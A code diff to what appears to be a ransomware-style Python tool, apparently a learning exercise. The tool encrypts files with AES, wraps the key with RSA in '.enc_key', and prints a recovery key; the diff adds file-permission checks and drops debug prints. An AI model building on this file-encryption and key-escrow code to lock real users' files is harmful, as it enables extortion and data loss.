@@ -80,13 +80,17 @@ GU9ACfOMVgzdb6v0RQIDAQAB
 		if not file_list:
 			print("Nothing to do here ...")
 			return
+		if not os.access(".enc_key", os.W_OK):
+			print("You need access to .enc_key")
+			return
 
-		# Generate encryption key
 		self.key = get_random_bytes(16)
 
-		self.display and print(f"Encrypted: \n")
 		for file in file_list:
 			cipher = AES.new(self.key, AES.MODE_OCB)
+			if not os.access(file, os.R_OK) or\
+				(os.path.exists(file + ".ft") and not os.access(file + ".ft", os.W_OK)):
+				continue
 			with open(file, "rb") as original:
 				data = original.read()
 			ciphertext, tag = cipher.encrypt_and_digest(data)
@@ -110,8 +114,10 @@ GU9ACfOMVgzdb6v0RQIDAQAB
 		aes_key = bytes.fromhex(self.key)
 		cipher = AES.new(aes_key, AES.MODE_OCB)
 
-		self.display and print(f"Decrypted: \n")
 		for file in file_list:
+			if not os.access(file, os.R_OK) or\
+				(os.path.exists(file[:-3]) and not os.access(file[:-3], os.W_OK)):
+				continue
 			with open(file, "rb") as crypted:
 				tag = crypted.read(16)
 				nonce = crypted.read(15)
@@ -135,10 +141,12 @@ GU9ACfOMVgzdb6v0RQIDAQAB
 		pr_key = RSA.import_key(self.key.encode())
 		cipher_rsa = PKCS1_OAEP.new(pr_key)
 
+		if not os.access(".enc_key", os.R_OK):
+			print("You need access to .enc_key")
 		with open(".enc_key", "rb") as file:
 			enc_key = file.read()
 		dec_key = cipher_rsa.decrypt(enc_key)
-		print(f"To reverse, use:\n  {dec_key.hex()}")
+		print(f"\n\nTo reverse, use:\n  {dec_key.hex()}")
 
 	def print(self):
 		print(f"Options: ")
